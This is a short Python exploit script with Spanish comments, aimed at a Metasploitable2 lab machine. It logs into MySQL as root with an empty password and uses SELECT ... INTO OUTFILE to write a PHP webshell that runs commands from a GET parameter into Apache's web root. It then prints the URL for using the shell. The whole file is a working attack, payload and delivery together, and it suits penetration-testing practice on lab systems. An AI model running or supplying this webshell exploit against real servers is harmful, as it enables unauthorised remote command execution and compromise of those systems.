#!/usr/bin/env python3
"""
Exploit: Escritura de webshell vía MySQL sin autenticación
Objetivo: Metasploitable2 con MySQL expuesto
Autor: Javier

Este script se conecta como root (sin contraseña) al servicio MySQL
y utiliza la función SELECT ... INTO OUTFILE para escribir una webshell PHP
en el directorio público de Apache (/var/www/html/).
"""

import mysql.connector
from mysql.connector import Error

host = "192.168.56.102"
user = "root"

try:
    conn = mysql.connector.connect(
        host=host,
        user=user,
        password='',  # sin contraseña
        use_pure=True
    )
    if conn.is_connected():
        print("[+] Conectado como root sin contraseña.")
        cursor = conn.cursor()
        
        # Payload PHP que ejecuta comandos vía GET
        shell_payload = "<?php system($_GET['cmd']); ?>"
        path = "/var/www/html/shell.php"
        
        try:
            cursor.execute(f'SELECT "{shell_payload}" INTO OUTFILE "{path}";')
            print(f"[+] Webshell escrita en {path}")
            print(f"[+] Accede desde: http://{host}/shell.php?cmd=id")
        except Error as e:
            if "already exists" in str(e):
                print("[!] El archivo ya existe. Posiblemente la shell ya está activa.")
                print(f"[>] Intenta acceder: http://{host}/shell.php?cmd=id")
            else:
                print(f"[!] Error al escribir shell: {e}")
        conn.close()
    else:
        print("[-] No se pudo conectar.")
except Error as err:
    print(f"[!] Error: {err}")
